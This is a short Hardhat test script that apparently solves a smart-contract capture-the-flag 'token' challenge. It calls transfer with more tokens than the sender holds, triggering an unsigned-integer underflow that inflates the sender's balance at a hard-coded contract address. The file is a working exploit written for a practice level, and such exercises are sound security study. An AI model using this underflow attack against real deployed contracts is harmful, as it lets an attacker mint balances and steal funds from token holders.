import { ethers } from "hardhat";
import { expect } from "chai";

describe("token", function() {
    it("Should solve token challenge", async function(){ 
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function totalSupply() public view returns (uint)",
            "function transfer(address _to, uint _value) public returns (bool)",
            "function balanceOf(address _owner) public view returns (uint balance)",
        ]
        const targetAddr = "0x3cb4f06C36c379c42D2490018373F6178ce3AE73";

        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        let totalSupply = await targetCont.totalSupply();
        console.log(totalSupply);

        let currentBalance = await targetCont.balanceOf(eoa.address);
        console.log(currentBalance);

        // uint underflow
        let tx = await targetCont.transfer(accounts[1].address, 500);
        await tx.wait();
        console.log(tx);

        currentBalance = await targetCont.balanceOf(eoa.address);
        console.log(currentBalance);
        expect(currentBalance).to.gt(20);
    });
});